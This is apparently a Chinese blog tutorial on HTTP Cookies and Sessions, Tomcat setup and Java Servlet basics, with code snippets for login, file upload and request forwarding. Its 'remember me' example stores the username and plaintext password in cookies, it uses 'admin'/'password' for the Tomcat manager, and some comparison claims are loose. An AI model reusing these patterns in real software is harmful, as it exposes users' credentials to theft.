Cookie\n\n### 什么是Cookie？\n\nCookie 是一种**服务端产生**但**存储在客户端**用于记录客户端状态的机制。\n\n### Cookie工作原理\n\n- **客户端首次请求服务器**：如果服务器需要记录该用户状态，就使用 response 向客户端颁发一个 Cookie，客户端会把 Cookie 保存起来；\n- **客户端再次请求服务器**：客户端会把请求连同该 Cookie 一同提交给服务器，服务器检查该 Cookie，以此来辨认用户状态。\n\n| 首次请求                                                     | 再次请求                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/v2-85622297a93f493c891ffb90b67fd5e0_b.png) | ![](https://img.jwt1399.top/img/v2-1f49734871c5e2da2d264d28ac310a65_b.png) |\n\n**首次请求**\n\n- ①request \n\n```http\nGET /reader/ HTTP/1.1\nHost: jwt1399.top\n```\n\n- ②response\n\n```http\nHTTP/1.1 200 OK\nDate: Thu, 12 Jul 2021 07:12:20 GMT\nServer: Apache\n＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞\nContent-Type: text/plain; charset=UTF-8\n```\n\n**再次请求**\n\n- ③request \n\n```http\nGET /image/ HTTP/1.1\nHost: jwt1399.top\nCookie: sid=1342077140226724\n```\n\n### Cookie的首部字段\n\n| 首部字段名 | 首部类型     | 说明                           |\n| ---------- | ------------ | ------------------------------ |\n| Set-Cookie | 响应首部字段 | 开始状态管理所使用的Cookie信息 |\n| Cookie     | 请求首部字段 | 服务器接收到的Cookie信息       |\n\n### Set-Cookie属性\n\n| 属性     | 说明                                                         |\n| -------- | ------------------------------------------------------------ |\n| name     | Cookie的名称。Cookie一旦创建，名称便不可更改                 |\n| value    | Cookie的值。如果值为Unicode字符，需要为字符编码。如果为二进制数据，则需要使用base64编码 |\n| expires  | Cookie的有效期(Cookie被删除时的时间戳)。格式为GMT，若设置为以前的时间，则该Cookie立刻被删除，并且该时间戳是服务器时间，不是本地时间！若不明确指定则默认为浏览器关闭前为止。 |\n| path     | Cookie的使用路径。若不指定则默认为文档所在的文件目录         |\n| domain   | 可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.” |\n| secure   | 仅在HTTPS 安全通信时才会发送Cookie，默认为false              |\n| HttpOnly | 加以限制，使Cookie不能被JavaScript 脚本访问                  |\n| maxAge   | Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为-1 |\n| Size     | Cookie的大小。在所有浏览器中，任何Cookie大小超过限制都被忽略，且永远不会被设置。各个浏览器对Cookie的最大值和最大数目有不同的限制 |\n| SameSite | 用来限制第三方 Cookie，从而减少安全风险。它有3个属性，分别是：Strict，Lax，None |\n| Priority | 优先级，chrome的提案，定义了三种优先级，Low/Medium/High，当cookie数量超出时，低优先级的cookie会被优先清除。 |\n| comment  | Cookie的用处说明，浏览器显示Cookie信息的时候显示该说明       |\n| version  | Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范 |\n\n### 实例测试\n\n我们可以编写一个测试用例来看看：\n\n```java\nCookie cookie = new Cookie(\"test\", \"yyds\");\nresp.addCookie(cookie);\nresp.sendRedirect(\"time\");\n```\n\n```java\nfor (Cookie cookie : req.getCookies()) {\n    System.out.println(cookie.getName() + \": \" + cookie.getValue());\n}\n```\n\n我们可以观察一下，在`HttpServletResponse`中添加Cookie之后，浏览器的响应头中会包含一个`Set-Cookie`属性，同时，在重定向之后，我们的请求头中，会携带此Cookie作为一个属性，同时，我们可以直接通过`HttpServletRequest`来快速获取有哪些Cookie信息。\n\n![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.uml.org.cn%2Fxjs%2Fimages%2F2019032226.jpg&refer=http%3A%2F%2Fwww.uml.org.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1640427806&t=a452f8b27a0769ca82d2269664e71a5e)\n\n\n\n最关键的其实是`name`、`value`、`maxAge`、`domain`属性。\n\n那么我们来尝试修改一下maxAge来看看失效时间：\n\n```java\ncookie.setMaxAge(20);\n```\n\n设定为20秒，我们可以直接看到，响应头为我们设定了20秒的过期时间。20秒内访问都会携带此Cookie，而超过20秒，Cookie消失。\n\n既然了解了Cookie的作用，我们就可以通过使用Cookie来实现记住我功能，我们可以将用户名和密码全部保存在Cookie中，如果访问我们的首页时携带了这些Cookie，那么我们就可以直接为用户进行登陆，如果登陆成功则直接跳转到首页，如果登陆失败，则清理浏览器中的Cookie。\n\n那么首先，我们先在前端页面的表单中添加一个勾选框：\n\n```html\n<div>\n    <label>\n        <input type=\"checkbox\" placeholder=\"记住我\" name=\"remember-me\">\n        记住我\n    </label>\n</div>\n```\n\n接着，我们在登陆成功时进行判断，如果用户勾选了记住我，那么就讲Cookie存储到本地：\n\n```java\nif(map.containsKey(\"remember-me\")){   //若勾选了勾选框，那么会此表单信息\n    Cookie cookie_username = new Cookie(\"username\", username);\n    cookie_username.setMaxAge(30);\n    Cookie cookie_password = new Cookie(\"password\", password);\n    cookie_password.setMaxAge(30);\n    resp.addCookie(cookie_username);\n    resp.addCookie(cookie_password);\n}\n```\n\n然后，我们修改一下默认的请求地址，现在一律通过`http://localhost:8080/yyds/login`进行登陆，那么我们需要添加GET请求的相关处理：\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Cookie[] cookies = req.getCookies();\n    if(cookies != null){\n        String username = null;\n        String password = null;\n        for (Cookie cookie : cookies) {\n            if(cookie.getName().equals(\"username\")) username = cookie.getValue();\n            if(cookie.getName().equals(\"password\")) password = cookie.getValue();\n        }\n        if(username != null && password != null){\n            //登陆校验\n            try (SqlSession sqlSession = factory.openSession(true)){\n                UserMapper mapper = sqlSession.getMapper(UserMapper.class);\n                User user = mapper.getUser(username, password);\n                if(user != null){\n                    resp.sendRedirect(\"time\");\n                    return;   //直接返回\n                }\n            }\n        }\n    }\n    req.getRequestDispatcher(\"/\").forward(req, resp);   //正常情况还是转发给默认的Servlet帮我们返回静态页面\n}\n```\n\n现在，30秒内都不需要登陆，访问登陆页面后，会直接跳转到time页面。\n\n现在已经离我们理想的页面越来越接近了，但是仍然有一个问题，就是我们的首页，无论是否登陆，所有人都可以访问，那么，如何才可以实现只有登陆之后才能访问呢？这就需要用到Session了。\n\n### Cookie缺点\n\n- Cookie 在 HTTP 消息中是明文传输，没有加密\n- Cookie 存储于浏览器，可以被篡改和攻击\n- Cookie 大小受到限制（通常限制为50 个，每个不超过4KB）\n\n## Session\n\n### 什么是Session？\n\nSession 是一种**存储在服务器端**用于记录客户端状态的机制。\n\n### Session工作原理\n\n- **客户端首次请求服务器**：服务器端会生成一个 Session ID 自己先保存下来，再发送给客户端，客户端收到后会将它保存在 Cookie 中\n- **客户端再次请求服务器**：客户端会把请求连同该 Session ID 一同提交给服务器，服务器检查该 Session ID，以此来辨认用户状态。\n\n![](https://img.jwt1399.top/img/v2-0b02fa4a73a8072eb03cdf78270235e1_b.png)\n\n### session的生命周期\n\n**Session何时生效：**\n\nSession 在用户访问首次访问服务器时创建，需要注意只有访问JSP、Servlet等程序时才会创建Session，只访问 HTML、IMAG 等静态资源并不会创建 Session，可调用 request.getSession(true) 强制生成 Session\n\n**Session何时失效：**\n\n服务器会把长时间没有活动的 Session 从服务器内存中清除，此时 Session 便失效。Tomcat 中Session 的默认失效时间为 30 分钟。\n\n### 实例测试\n\n那么现在，我们在用户登录成功之后，将用户对象添加到Session中，只要是此用户发起的请求，我们都可以从`HttpSession`中读取到存储在会话中的数据：\n\n```java\nHttpSession session = req.getSession();\nsession.setAttribute(\"user\", user);\n```\n\n同时，如果用户没有登录就去访问首页，那么我们将发送一个重定向请求，告诉用户，需要先进行登录才可以访问：\n\n```java\nHttpSession session = req.getSession();\nUser user = (User) session.getAttribute(\"user\");\nif(user == null) {\n    resp.sendRedirect(\"login\");\n    return;\n}\n```\n\n在访问的过程中，注意观察Cookie变化。\n\nSession并不是永远都存在的，它有着自己的过期时间，默认时间为30分钟，若超过此时间，Session将丢失，我们可以在配置文件中修改过期时间：\n\n```xml\n<session-config>\n    <session-timeout>1</session-timeout>\n</session-config>\n```\n\n我们也可以在代码中使用`invalidate`方法来使Session立即失效：\n\n```java\nsession.invalidate();\n```\n\n现在，通过Session，我们就可以更好地控制用户对于资源的访问，只有完成登陆的用户才有资格访问首页。\n\n### Session缺点\n\n- 基于 Cookie 的机制容易被 CSRF\n- 如果是分布式部署，需要做多机共享 Session 机制\n- 存储在服务端，占用资源\n\n## 两者对比\n\n- Cookie 机制是通过**检查客户身上的“通行证”**来确认客户身份\n\n- Session 机制是通过**检查服务器上的“客户明细表”**来确认客户身份\n\n|          | Cookie   | Session    |\n| -------- | -------- | ---------- |\n| 存储位置 | 客户端   | 服务端     |\n| 存储大小 | 有限制   | 无限制     |\n| 跨域支持 | 支持     | 不支持     |\n| 存储信息 | 不加密   | 加密       |\n| 生命周期 | 可自定义 | 不可自定义 |\n\n## 面试题\n\n### 如果没有 Cookie 的话 Session 还能用吗？\n\n一般是通过 `Cookie` 来保存 `SessionID` ，假如你使用了 `Cookie` 保存 `SessionID` 的方案的话， 如果客户端禁用了 `Cookie`，那么 `Session` 就无法正常工作。\n\n但是，并不是没有 `Cookie` 之后就不能用 `Session` 了，比如你可以将 `SessionID` 放在请求的 `url` 里面`https://javaguide.cn/?Session_id=xxx` 。这种方案的话可行，但是安全性和用户体验感降低。当然，为了你也可以对 `SessionID` 进行一次加密之后再传入后端。\n\n## 参考\n\n- [认识HTTP----Cookie和Session篇 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/27669892)\n- 《图解HTTP》\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["HTTP"],"categories":["JavaWeb"]},{"title":"Servlet","url":"/posts/55715.html","content":"\n## 准备工作\n\n### Tomcat\n\nTomcat 就是一个典型的 Web 应用服务器软件，通过运行 Tomcat 服务器，我们就可以快速部署我们的 Web 项目，并交由 Tomcat 进行管理，我们只需要直接通过浏览器访问我们的项目即可。\n\n#### 安装Tomcat\n\n下载地址：https://tomcat.apache.org/download-10.cgi\n\n- 点击左侧的downloads，选择对应的版本\n\n- 下载完成后，解压，我放到了`opt/`目录下\n\n#### 启动Tomcat\n\n1. 打开终端，执行命令`cd /opt/apache-tomcat-10.0.20/bin`，进入到tomcat的bin目录下\n2. 输入：`./startup.sh` + 回车\n   - 如出现错误：“Permission denied” ，赋予超级管理员权限`sudo chmod 755 *.sh` \n   - 如果出现乱码，说明编码格式配置有问题，打开`conf`文件夹，找到 `logging.properties`文件，将ConsoleHandler的默认编码格式修改为GBK编码格式：`java.util.logging.ConsoleHandler.encoding = GBK`\n\n3. 打开浏览器，输入网址 http://localhost:8080/，如果出现一只三角猫，表示tomcat安装成功\n\n4. 关闭Tomcat：在bin目录下，终端输入命令：`./shutdown.sh` \n\n#### Tomcat目录\n\n```bash\n$ tree -L 1\n.\n├── bin\n├── conf\n├── lib\n├── logs\n├── temp\n├── webapps\n└── work\n```\n\n- bin目录：所有可执行文件，包括启动和关闭服务器的脚本\n- conf目录：服务器配置文件目录\n\n* lib目录：Tomcat服务端运行的一些依赖\n* logs目录：所有的日志信息都在这里\n* temp目录：存放运行时产生的一些临时文件，不用关心\n* work目录：工作目录，Tomcat会将jsp文件转换为java文件\n* webapps目录：所有的Web项目都在这里，每个文件夹都是一个Web应用程序：\n\n我们发现，官方已经给我们预设了一些项目了，访问后默认使用的项目为ROOT项目，也就是我们默认打开的网站。\n\nTomcat还自带管理页面，我们打开：http://localhost:8080/manager，提示需要用户名和密码，\n\n需要先去`conf/tomcat-users.xml`配置用户名和密码\n\n```xml\n<role rolename=\"manager-gui\"/>\n<user username=\"admin\" password=\"password\" roles=\"manager-gui\"/>\n```\n\n现在再次打开管理页面，已经可以成功使用此用户进行登陆了。登录后，展示给我们的是一个图形化界面，我们可以快速预览当前服务器的一些信息，包括已经在运行的Web应用程序，甚至还可以查看当前的Web应用程序有没有出现内存泄露。还有一个虚拟主机管理页面，用于一台主机搭建多个Web站点\n\n### Maven创建Web项目\n\n- 1、打开IDEA，新建一个项目，选择 Java Enterprise（社区版没有此选项）\n- 2、项目模板选择Web应用程序\n- 3、然后需要配置Web应用程序服务器，将前面下载的Tomcat服务器集成到IDEA中。\n  - 首先点击新建，然后设置Tomcat主目录即可，配置完成后，点击下一步即可，依赖项使用默认即可，然后点击完成，之后IDEA会自动帮助我们创建Maven项目。\n\n- 4、创建完成后，直接点击右上角即可运行此项目了，但是我们发现，有一个Servlet页面不生效。因为 Tomcat 10 以上的版本比较新，Servlet API包名发生了一些变化\n  - 因此我们需要修改一下依赖\n  - 包名也需要全部从 `javax` 改为 `jakarta` ，我们需要手动修改一下。\n\n```xml\n<dependency>\n    <groupId>jakarta.servlet</groupId>\n    <artifactId>jakarta.servlet-api</artifactId>\n    <version>5.0.0</version>\n    <scope>provided</scope>\n</dependency>\n```\n\n我们可以使用Maven 的 package 命令将项目直接打包为war包（默认），默认在项目的target目录下，然后放入webapp文件夹，就可以直接运行我们通过Java编写的Web应用程序了，访问路径为文件的名称。\n\n## Servlet 简介\n\nServlet 是 Server Applet 的缩写，译为“服务器端小程序”，是一种使用 Java 语言来开发动态网站的技术。\n\nServlet 是 Java EE 的一个标准，大部分的 Web 服务器都支持此标准，包括 Tomcat，就像之前的JDBC一样，由官方定义了一系列接口，而具体实现由我们来编写，最后交给Web服务器（如Tomcat）来运行我们编写的Servlet。\n\n## 创建Servlet\n\n### 使用注解配置\n\n如何创建一个Servlet呢，只需要实现`Servlet`类即可，并添加注解`@WebServlet`来进行注册。\n\n```java\n@WebServlet(\"/test\")\npublic class TestServlet implements Servlet {\n\t\t...//实现接口方法\n}\n```\n\n现在就可以访问一下我们的页面：http://localhost:8080/xxx/test\n\n### 使用web.xml配置\n\n除了直接编写一个类，我们也可以在`web.xml`中进行注册，现将类上`@WebServlet`的注解去掉：\n\n```xml\n<servlet>\n    <servlet-name>test</servlet-name>\n    <servlet-class>com.example.webtest.TestServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>test</servlet-name>\n    <url-pattern>/test</url-pattern>\n</servlet-mapping>\n```\n\n这样的方式也能注册Servlet，但是显然直接使用注解更加方便，因此之后我们一律使用注解进行开发。\n\n## Servlet生命周期\n\n接着来看看，一个Servlet是如何运行的。首先我们需要了解，Servlet中的方法各自是在什么时候被调用的，我们先编写一个打印语句来看看\n\n```java\npublic class TestServlet implements Servlet {\n\n    public TestServlet(){\n        System.out.println(\"我是构造方法！\");\n    }\n\n    @Override\n    public void init(ServletConfig servletConfig) throws ServletException {\n        System.out.println(\"我是init\");\n    }\n\n    @Override\n    public ServletConfig getServletConfig() {\n        System.out.println(\"我是getServletConfig\");\n        return null;\n    }\n\n    @Override\n    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {\n        System.out.println(\"我是service\");\n    }\n\n    @Override\n    public String getServletInfo() {\n        System.out.println(\"我是getServletInfo\");\n        return null;\n    }\n\n    @Override\n    public void destroy() {\n        System.out.println(\"我是destroy\");\n    }\n}\n```\n\n我们首先启动一次服务器，然后访问我们定义的页面，然后再关闭服务器，得到如下的顺序：\n\n```\n我是构造方法！\n我是init\n我是service\n\n我是destroy\n```\n\n我们可以多次尝试去访问此页面，但是`init`和`构造方法`只会执行一次，而每次访问都会执行的是`service`方法，因此，一个Servlet的生命周期为：\n\n- 首先执行构造方法完成 Servlet 初始化\n- Servlet 初始化后调用 **init ()** 方法\n- Servlet 调用 **service()** 方法来处理客户端的请求\n- Servlet 销毁前调用 **destroy()** 方法\n- 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。\n\n![Servlet 生命周期](https://img.jwt1399.top/img/14224J192-0.png)\n\n在Web应用程序运行时，每当浏览器向服务器发起一个请求时，都会创建一个线程执行一次`service`方法，来让我们处理用户的请求，并将结果响应给用户。\n\n`service`方法中有两个参数，`ServletRequest`和`ServletResponse`，实际上，用户发起的HTTP请求，就被Tomcat服务器封装为了一个`ServletRequest`对象，我们得到是其实是Tomcat服务器帮助我们创建的一个实现类，HTTP请求报文中的所有内容，都可以从`ServletRequest`对象中获取，同理，`ServletResponse`就是我们需要返回给浏览器的HTTP响应报文实体类封装。\n\n那么我们来看看`ServletRequest`中有哪些内容，我们可以获取请求的一些信息：\n\n```java\n@Override\npublic void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {\n    //首先将其转换为HttpServletRequest（继承自ServletRequest，一般是此接口实现）\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        \n        System.out.println(request.getProtocol());  //获取协议版本\n        System.out.println(request.getRemoteAddr());  //获取访问者的IP地址\n  \t\t  System.out.println(request.getMethod());   //获取请求方法\n        //获取头部信息\n        Enumeration<String> enumeration = request.getHeaderNames();\n        while (enumeration.hasMoreElements()){\n            String name = enumeration.nextElement();\n            System.out.println(name + \": \" + request.getHeader(name));\n        }\n}\n```\n\n我们发现，整个HTTP请求报文中的所有内容，都可以通过`HttpServletRequest`对象来获取，当然，它的作用肯定不仅仅是获取头部信息，我们还可以使用它来完成更多操作\n\n再来看看`ServletResponse`，这个是服务端的响应内容，填写想要发送给浏览器显示的内容：\n\n```java\n//转换为HttpServletResponse（同上）\nHttpServletResponse response = (HttpServletResponse) servletResponse;\n//设定内容类型以及编码格式（普通HTML文本使用text/html，之后会讲解文件传输）\nresponse.setHeader(\"Content-type\", \"text/html;charset=UTF-8\");\n//获取Writer直接写入内容\nresponse.getWriter().write(\"我是响应内容！\");\n//所有内容写入完成之后，再发送给浏览器\n```\n\n现在我们在浏览器中打开此页面，就能够收到服务器发来的响应内容了。其中，响应头部分，是由Tomcat帮助我们生成的一个默认响应头。\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fwww.qingruanit.net%252FcatchImages%252F20170218%252F1487385940733020268.png&refer=http%253A%252F%252Fwww.qingruanit.jpeg)\n\n## HttpServlet\n\n```java\npublic abstract class GenericServlet implements Servlet {}\npublic abstract class HttpServlet extends GenericServlet {}\n```\n\n- HttpServlet 继承自 GenericServlet 类\n- GenericServlet 实现了 Servlet 接口\n\n`Servlet`有一个直接实现抽象类`GenericServlet`，这个类完善了配置文件读取和Servlet信息相关的的操作，但是依然没有去实现service方法\n\n`HttpServlet`，它是遵循HTTP协议的一种Servlet，继承自`GenericServlet`，它根据HTTP协议的规则，完善了service方法。\n\n因此只需要继承 HttpServlet 就可以编写我们的 Servlet 了，并且它已经帮助我们提前实现了一些操作，这样就会给我们省去很多的时间。\n\n```java\n@WebServlet(\"/test\")\npublic class TestServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(\"<h1>测试一下下</h1>\");\n    }\n}\n```\n\n## @WebServlet注解\n\n可以直接使用 WebServlet 注解来快速注册一个 Servlet\n\n| 属性名         | 类型            | 描述                                                         | 必需 |\n| -------------- | --------------- | ------------------------------------------------------------ | ---- |\n| name           | String          | 指定 Servlet 的 name 属性。 如果没有显式指定，则取值为该 Servlet 的完全限定名，即包名+类名。 | 否   |\n| value          | String[ ]       | 该属性等价于 urlPatterns 属性，两者不能同时指定。 如果同时指定，通常是忽略 value 的取值。 | 是   |\n| urlPatterns    | String[ ]       | 代表当前Servlet的访问路径。                                  | 是   |\n| loadOnStartup  | int             | 指定 Servlet 的加载顺序。                                    | 否   |\n| initParams     | WebInitParam[ ] | 指定一组 Servlet 初始化参数。                                | 否   |\n| asyncSupported | boolean         | 声明 Servlet 是否支持异步操作模式。                          | 否   |\n| description    | String          | 指定该 Servlet 的描述信息。                                  | 否   |\n| displayName    | String          | 指定该 Servlet 的显示名。                                    | 否   |\n\n```java\n@WebServlet(urlPatterns = \"/test/*\")\n//可省略urlPatterns\n@WebServlet(\"/test/*\")\n```\n\n上面的路径表示，所有匹配`/test/随便什么`的路径名称，都可以访问此Servlet\n\n也可以进行某个扩展名称的匹配：\n\n```java\n@WebServlet(\"*.js\")\n```\n\n这样的话，获取任何以js结尾的文件，都会由我们自己定义的Servlet处理。\n\n还可以为一个Servlet配置多个访问路径：\n\n```java\n@WebServlet({\"/test1\", \"/test2\"})\n```\n\n接着看 loadOnStartup 属性，此属性决定了是否在Tomcat启动时就加载此Servlet，默认情况下，Servlet只有在被访问时才会加载，它的默认值为-1，表示不在启动时加载，我们可以将其修改为大于等于0的数，来开启启动时加载。并且数字的大小决定了此Servlet的启动优先级。\n\n```java\n@Log\n@WebServlet(value = \"/test\", loadOnStartup = 1)\npublic class TestServlet extends HttpServlet {\n\n    @Override\n    public void init() throws ServletException {\n        super.init();\n        log.info(\"我被初始化了！\");\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(\"<h1>恭喜你解锁了全新玩法</h1>\");\n    }\n}\n```\n\n## POST请求完成登录\n\n创建一个 Servlet，让其能够接收一个 POST 请求：\n\n```java\n@WebServlet(\"/login\")\npublic class LoginServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        req.getParameterMap().forEach((k, v) -> {\n            System.out.println(k + \": \" + Arrays.toString(v));\n        });\n    }\n}\n```\n\n`ParameterMap`存储了我们发送的POST请求所携带的表单数据，我们可以直接将其遍历查看，浏览器发送了什么数据。\n\n现在我们再来修改一下前端：\n\n```html\n<body>\n    <h1>登录到系统</h1>\n    <form method=\"post\" action=\"login\">\n        <hr>\n        <div>\n            <label>\n                <input type=\"text\" placeholder=\"用户名\" name=\"username\">\n            </label>\n        </div>\n        <div>\n            <label>\n                <input type=\"password\" placeholder=\"密码\" name=\"password\">\n            </label>\n        </div>\n        <div>\n            <button>登录</button>\n        </div>\n    </form>\n</body>\n```\n\n现在我们点击登录按钮，会自动向后台发送一个POST请求，请求地址为当前地址+/login，也就是我们上面编写的Servlet路径。\n\n## 上传和下载文件\n\n首先将icon.png放入到resource文件夹中，接着我们编写一个Servlet用于处理文件下载：\n\n```java\n@WebServlet(\"/file\")\npublic class FileServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n      resp.setContentType(\"image/png\");  \n      OutputStream outputStream = resp.getOutputStream();\n      InputStream inputStream = Resources.getResourceAsStream(\"icon.png\");\n\n    }\n}\n```\n\n为了更加快速地编写IO代码，我们可以引入一个工具库：\n\n```xml\n<dependency>\n    <groupId>commons-io</groupId>\n    <artifactId>commons-io</artifactId>\n    <version>2.6</version>\n</dependency>\n```\n\n使用此类库可以快速完成IO操作：\n\n```java\nresp.setContentType(\"image/png\");\nOutputStream outputStream = resp.getOutputStream();\nInputStream inputStream = Resources.getResourceAsStream(\"icon.png\");\n//直接使用copy方法完成转换\nIOUtils.copy(inputStream, outputStream);\n```\n\n现在我们在前端页面添加一个链接，用于下载此文件：\n\n```html\n<hr>\n<a href=\"file\" download=\"icon.png\">点我下载高清资源</a>\n```\n\n下载文件搞定，那么如何上传一个文件呢？\n\n首先我们编写前端部分：\n\n```html\n<form method=\"post\" action=\"file\" enctype=\"multipart/form-data\">\n    <div>\n        <input type=\"file\" name=\"test-file\">\n    </div>\n    <div>\n        <button>上传文件</button>\n    </div>\n</form>\n```\n\n注意必须添加`enctype=\"multipart/form-data\"`，来表示此表单用于文件传输。\n\n现在来修改一下Servlet代码：\n\n```java\n@MultipartConfig\n@WebServlet(\"/file\")\npublic class FileServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        try(FileOutputStream stream = new FileOutputStream(\"/Users/nagocoler/Documents/IdeaProjects/WebTest/test.png\")){\n            Part part = req.getPart(\"test-file\");\n            IOUtils.copy(part.getInputStream(), stream);\n            resp.setContentType(\"text/html;charset=UTF-8\");\n            resp.getWriter().write(\"文件上传成功！\");\n        }\n    }\n}\n```\n\n注意，必须添加`@MultipartConfig`注解来表示此Servlet用于处理文件上传请求。\n\n现在再运行服务器，并将我们刚才下载的文件又上传给服务端。\n\n## 使用XHR请求数据\n\n现在我们希望，网页中的部分内容，可以动态显示，比如网页上有一个时间，旁边有一个按钮，点击按钮就可以刷新当前时间。\n\n这个时候就需要我们在网页展示时向后端发起请求了，并根据后端响应的结果，动态地更新页面中的内容，要实现此功能，就需要用到JavaScript来帮助我们，首先在js中编写我们的XHR请求，并在请求中完成动态更新：\n\n```js\nfunction updateTime() {\n    let xhr = new XMLHttpRequest();\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4 && xhr.status === 200) {\n            document.getElementById(\"time\").innerText = xhr.responseText\n        }\n    };\n    xhr.open('GET', 'time', true);\n    xhr.send();\n}\n```\n\n接着修改一下前端页面，添加一个时间显示区域：\n\n```html\n<hr>\n<div id=\"time\"></div>\n<br>\n<button onclick=\"updateTime()\">更新数据</button>\n<script>\n    updateTime()\n</script>\n```\n\n最后创建一个Servlet用于处理时间更新请求：\n\n```java\n@WebServlet(\"/time\")\npublic class TimeServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\");\n        String date = dateFormat.format(new Date());\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(date);\n    }\n}\n```\n\n现在点击按钮就可以更新了。\n\nGET请求也能传递参数，这里做一下演示。\n\n## 重定向与请求转发\n\n当我们希望用户登录完成之后，直接跳转到网站的首页，那么这个时候，我们就可以使用重定向来完成。当浏览器收到一个重定向的响应时，会按照重定向响应给出的地址，再次向此地址发出请求。\n\n实现重定向很简单，只需要调用一个方法即可，我们修改一下登陆成功后执行的代码：\n\n```java\nresp.sendRedirect(\"time\");\n```\n\n调用后，响应的状态码会被设置为302，并且响应头中添加了一个Location属性，此属性表示，需要重定向到哪一个网址。\n\n接着来看请求转发，请求转发其实是一种服务器内部的跳转机制，我们知道，重定向会使得浏览器去重新请求一个页面，而请求转发则是服务器内部进行跳转，它的目的是，直接将本次请求转发给其他Servlet进行处理，并由其他Servlet来返回结果，因此它是在进行内部的转发。\n\n```java\nreq.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\n现在，在登陆成功的时候，我们将请求转发给处理时间的Servlet，注意这里的路径规则和之前的不同，我们需要填写Servlet上指明的路径，并且请求转发只能转发到此应用程序内部的Servlet，不能转发给其他站点或是其他Web应用程序。\n\n现在再次进行登陆操作，我们发现，返回结果为一个405页面，证明了，我们的请求现在是被另一个Servlet进行处理，并且请求的信息全部被转交给另一个Servlet，由于此Servlet不支持POST请求，因此返回405状态码。\n\n那么也就是说，该请求包括请求参数也一起被传递了，那么我们可以尝试获取以下POST请求的参数。\n\n现在我们给此Servlet添加POST请求处理，直接转交给Get请求处理：\n\n```java\n@Override\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    this.doGet(req, resp);\n}\n```\n\n再次访问，成功得到结果，但是我们发现，浏览器只发起了一次请求，并没有再次请求新的URL，也就是说，这一次请求直接返回了请求转发后的处理结果。\n\n那么，请求转发有什么好处呢？它可以携带数据！\n\n```java\nreq.setAttribute(\"test\", \"我是请求转发前的数据\");\nreq.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\n```java\nSystem.out.println(req.getAttribute(\"test\"));\n```\n\n通过`setAttribute`方法来给当前请求添加一个附加数据，在请求转发后，我们可以直接获取到该数据。\n\n重定向属于2次请求，因此无法使用这种方式来传递数据，那么，如何在重定向之间传递数据呢？我们可以使用即将要介绍的ServletContext对象。\n\n最后总结，两者的区别为：\n\n* 请求转发是一次请求，重定向是两次请求\n* 请求转发地址栏不会发生改变， 重定向地址栏会发生改变\n* 请求转发可以共享请求参数 ，重定向之后，就获取不了共享参数了\n* 请求转发只能转发给内部的Servlet\n\n## ServletContext对象\n\nServletContext全局唯一，它是属于整个Web应用程序的，我们可以通过`getServletContext()`来获取到此对象。\n\n此对象也能设置附加值：\n\n```java\nServletContext context = getServletContext();\ncontext.setAttribute(\"test\", \"我是重定向之前的数据\");\nresp.sendRedirect(\"time\");\n```\n\n```java\nSystem.out.println(getServletContext().getAttribute(\"test\"));\n```\n\n因为无论在哪里，无论什么时间，获取到的ServletContext始终是同一个对象，因此我们可以随时随地获取我们添加的属性。\n\n它不仅仅可以用来进行数据传递，还可以做一些其他的事情，比如请求转发：\n\n```java\ncontext.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\n它还可以获取根目录下的资源文件（注意是webapp根目录下的，不是resource中的资源）\n\n## 